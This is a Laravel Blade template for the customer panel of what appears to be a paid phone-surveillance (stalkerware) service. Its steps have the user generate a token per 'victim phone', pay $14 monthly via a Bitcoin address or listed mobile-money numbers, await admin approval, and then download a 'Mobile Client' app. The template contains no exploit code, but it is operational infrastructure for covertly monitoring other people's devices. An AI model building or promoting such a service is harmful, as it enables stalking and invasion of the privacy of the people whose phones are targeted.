{{-- <div class="row"> --}}
    <div class="card card-outline card-primary">
    <div class="card-header">
      <h3 class="card-title">STEP 1</h3>

      <div class="card-tools">
        <button type="button" class="btn btn-tool" data-card-widget="collapse"><i class="fas fa-minus"></i>
        </button>
      </div>
      <!-- /.card-tools -->
    </div>
    <!-- /.card-header -->
    <div class="card-body">
      Click the below button to generate a token
      @if ($token ==  null)
        <button type="button" class="btn btn-block btn-outline-primary btn-flat" wire:click="genToken">New Token</button> 
      
      @else
        <button type="button" class="btn btn-block btn-outline-primary btn-flat disabled">New Token</button> 
        <br>NEW TOKEN:>>  <b> {{$token}} </b><br><br>
        <div class="row">
          <div class="col-sm-2">
            <b>NOTE:</b>
          </div>
          <div class="col-sm-10">
              <ul>
                <li>This token will <em>disappear</em>. Copy or note it down somewhere</li>
                <li>Each token will only work on 1 phone. Generate a new token if you want to add another victim phone</li>
                <li>The token will <b>only be valid for 2 hours</b> after which payment should be made as described in <b>STEP 2</b></li>
              </ul>
          </div>
        </div>
      @endif
    </div>
    <!-- /.card-body -->
  </div>
  <div class="card card-outline card-primary">
    <div class="card-header">
      <h3 class="card-title">STEP 2</h3>

      <div class="card-tools">
        <button type="button" class="btn btn-tool" data-card-widget="collapse"><i class="fas fa-minus"></i>
        </button>
      </div>
      <!-- /.card-tools -->
    </div>
    <!-- /.card-header -->
    <div class="card-body">
      TO ACTIVATE, Make MONTHLY PAYMENTS of <b>14 USD ($14)</b> using any of the acceptable below payment methods AND include <b>token as the reason</b>
      <br>
      <hr>
      <div class="row">
        <div class="col-sm-2">
          <img src="https://img.icons8.com/color/48/000000/bitcoin--v1.png"/><br>
          BITCOIN
        </div>
        <div class="col-sm-10">
          3N4pramcAx9j1LrvdKbPd7dDBP5wsSyVCa
        </div>
      </div>
      <hr>
      <div class="row">
        <div class="col-sm-2">
          <img src="{{ URL::asset('assets/img/chippercash.png') }}" alt=""><br>
          CHIPPER CASH
        </div>
        <div class="col-sm-10">
          @c0m3t
        </div>
      </div>
      <hr>
      <div class="row">
        <div class="col-sm-2">
          <img src="{{ URL::asset('assets/img/airtel-money.jpeg') }}" alt="">
        </div>
        <div class="col-sm-10">
          +256 751028655
        </div>
      </div>
      <hr>
      <div class="row">
        <div  class="col-sm-2">
          <img src="{{ URL::asset('assets/img/mtn-money.jpeg') }}" alt="">
        </div>
        <div class="col-sm-10">
          +256 760087659
        </div>
      </div>

    </div>
    <!-- /.card-body -->
  </div>
  <div class="card card-outline card-primary">
    <div class="card-header">
      <h3 class="card-title">STEP 3</h3>

      <div class="card-tools">
        <button type="button" class="btn btn-tool" data-card-widget="collapse"><i class="fas fa-minus"></i>
        </button>
      </div>
      <!-- /.card-tools -->
    </div>
    <!-- /.card-header -->
    <div class="card-body">
      Wait for token to be verified by Administrator in less than one hour
    </div>
    <!-- /.card-body -->
  </div>
  <div class="card card-outline card-primary">
    <div class="card-header">
      <h3 class="card-title">STEP 4</h3>

      <div class="card-tools">
        <button type="button" class="btn btn-tool" data-card-widget="collapse"><i class="fas fa-minus"></i>
        </button>
      </div>
      <!-- /.card-tools -->
    </div>
    <!-- /.card-header -->
    <div class="card-body">
      Go to <a href="#"><em wire:click="showMobileClient"><b>Mobile Client Option</b></em></a> Download the App and follow the procedures
    </div>
    <!-- /.card-body -->
  </div>

{{-- </div> --}}
